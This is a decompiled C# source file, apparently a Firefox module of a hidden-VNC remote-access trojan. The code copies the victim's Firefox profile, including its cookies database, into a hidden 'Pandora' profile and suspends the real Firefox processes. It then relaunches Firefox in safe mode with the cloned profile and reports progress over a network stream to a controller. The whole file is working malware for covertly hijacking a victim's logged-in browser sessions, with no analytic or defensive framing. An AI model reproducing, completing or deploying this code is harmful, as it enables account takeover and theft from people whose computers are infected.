using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using DLL.Functions;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace DLL.Browser
{
	// Token: 0x0200000B RID: 11
	public class Firefox
	{
		// Token: 0x0600005E RID: 94
		[DllImport("user32.dll")]
		public static extern IntPtr SetWindowPos(IntPtr hWnd, int hWndInsertAfter, int x, int Y, int cx, int cy, int wFlags);

		// Token: 0x0600005F RID: 95 RVA: 0x00005654 File Offset: 0x00003854
		public static void StartFirefox(bool duplicate)
		{
			try
			{
				if (Conversions.ToBoolean(Outils.IsFileOpen(new FileInfo(Interaction.Environ("appdata") + "\\Mozilla\\Firefox\\Profiles\\Pandora\\parent.lock"))))
				{
					Outils.SendInformation(Outils.nstream, "25|Firefox has already been opened!");
				}
				else
				{
					string path = Interaction.Environ("appdata") + "\\Mozilla\\Firefox\\Profiles";
					string str = string.Empty;
					if (Directory.Exists(path))
					{
						foreach (string text in Directory.GetDirectories(path))
						{
							if (File.Exists(text + "\\cookies.sqlite"))
							{
								str = Path.GetFileName(text);
								break;
							}
						}
						if (duplicate)
						{
							Outils.SendInformation(Outils.nstream, "22|" + Conversions.ToString(Math.Round((double)new GetDirSize().GetDirSizez(Interaction.Environ("appdata") + "\\Mozilla\\Firefox\\Profiles\\" + str) / 1024.0 / 1024.0)));
							try
							{
								Outils.a.FileSystem.CopyDirectory(Interaction.Environ("appdata") + "\\Mozilla\\Firefox\\Profiles\\" + str, Interaction.Environ("appdata") + "\\Mozilla\\Firefox\\Profiles\\Pandora", true);
							}
							catch (Exception ex)
							{
							}
							Outils.SendInformation(Outils.nstream, "202|" + Conversions.ToString(Math.Round((double)new GetDirSize().GetDirSizez(Interaction.Environ("appdata") + "\\Mozilla\\Firefox\\Profiles\\" + str) / 1024.0 / 1024.0)));
						}
						else
						{
							Outils.SendInformation(Outils.nstream, "203|" + Conversions.ToString(Math.Round((double)new GetDirSize().GetDirSizez(Interaction.Environ("appdata") + "\\Mozilla\\Firefox\\Profiles\\" + str) / 1024.0 / 1024.0)));
						}
						Process[] processesByName = Process.GetProcessesByName("firefox");
						for (int i = 0; i < processesByName.Length; i++)
						{
							Outils.SuspendProcess(processesByName[i]);
						}
						Process.Start("firefox", "-new-window -safe-mode -no-remote -profile \"" + Interaction.Environ("appdata") + "\\Mozilla\\Firefox\\Profiles\\Pandora\"");
						Stopwatch stopwatch = new Stopwatch();
						stopwatch.Start();
						IntPtr intPtr = IntPtr.Zero;
						while (intPtr == IntPtr.Zero)
						{
							Rectangle workingArea = Screen.AllScreens[0].WorkingArea;
							Firefox.SetWindowPos(Outils.FindHandle("Firefox Safe Mode"), 0, workingArea.Left, workingArea.Top, workingArea.Width, workingArea.Height, 68);
							intPtr = Outils.FindHandle("Firefox Safe Mode");
							if (stopwatch.ElapsedMilliseconds >= 5000L)
							{
								break;
							}
						}
						stopwatch.Stop();
						Outils.PostMessage(intPtr, 256U, (IntPtr)13, (IntPtr)1);
						Stopwatch stopwatch2 = new Stopwatch();
						stopwatch2.Start();
						while (Outils.FindHandle("Welcome to HVNC !") == (IntPtr)0)
						{
							Rectangle workingArea2 = Screen.AllScreens[0].WorkingArea;
							Firefox.SetWindowPos(Outils.FindHandle("Welcome to HVNC !"), 0, workingArea2.Left, workingArea2.Top, workingArea2.Width, workingArea2.Height, 68);
							Application.DoEvents();
							if (stopwatch2.ElapsedMilliseconds >= 5000L)
							{
								processesByName = Process.GetProcessesByName("firefox");
								for (int i = 0; i < processesByName.Length; i++)
								{
									Outils.ResumeProcess(processesByName[i]);
								}
								break;
							}
						}
						stopwatch2.Stop();
						processesByName = Process.GetProcessesByName("firefox");
						for (int i = 0; i < processesByName.Length; i++)
						{
							Outils.ResumeProcess(processesByName[i]);
						}
					}
				}
			}
			catch (Exception ex2)
			{
			}
		}

		// Token: 0x04000049 RID: 73
		private const short SWP_NOMOVE = 2;

		// Token: 0x0400004A RID: 74
		private const short SWP_NOSIZE = 1;

		// Token: 0x0400004B RID: 75
		private const short SWP_NOZORDER = 4;

		// Token: 0x0400004C RID: 76
		private const int SWP_SHOWWINDOW = 64;
	}
}
